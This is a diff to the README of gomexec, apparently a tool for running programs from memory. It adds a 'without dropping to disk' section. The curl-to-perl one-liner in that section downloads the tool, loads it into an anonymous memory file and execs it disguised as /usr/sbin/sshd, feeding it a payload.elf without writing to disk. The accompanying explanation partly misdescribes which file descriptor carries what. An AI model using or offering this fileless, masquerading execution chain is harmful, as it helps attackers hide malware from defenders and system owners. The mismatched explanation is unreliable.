@@ -21,6 +21,24 @@ Replace `amd64` with your arch: `arm64`, `armv7`, `mips_softfloat`, `mipsle_soft
 go install github.com/ohmymex/gomexec@latest
 ```
 
+**Without dropping gomexec to disk at all** (perl bootstrap, inspired by [THC Tips & Tricks](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)):
+
+```bash
+curl -sL https://github.com/ohmymex/gomexec/releases/latest/download/gomexec_linux_amd64.tar.gz \
+| tar xOz gomexec \
+| NAME=/usr/sbin/sshd perl -e '
+local $/;
+$d = <STDIN>;
+$f = syscall(319, $n="", 1);
+open($o, ">&=".$f) or die;
+print $o $d;
+open(STDIN, "<&=", 3) or die;
+exec {"/proc/$$/fd/$f"} "/usr/sbin/sshd" or die;
+' 3< payload.elf
+```
+
+The perl one-liner loads gomexec into a memfd via fd 3 (bash process substitution, no file created on disk), then redirects stdin to fd 3 before exec so gomexec receives the payload entirely in memory.
+
 ## Usage
 
 ```bash
@@ -87,7 +105,8 @@ Outputs static binaries to `dist/` for: `linux/amd64`, `linux/arm64`, `linux/arm
 
 ## Credits
 
-Inspired by [hackerschoice/memexec](https://github.com/hackerschoice/memexec).
+- [hackerschoice/memexec](https://github.com/hackerschoice/memexec) - original memexec concept
+- [hackerschoice/thc-tips-tricks-hacks-cheat-sheet](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet) - perl memfd bootstrap technique
 
 ## Supported architectures
 
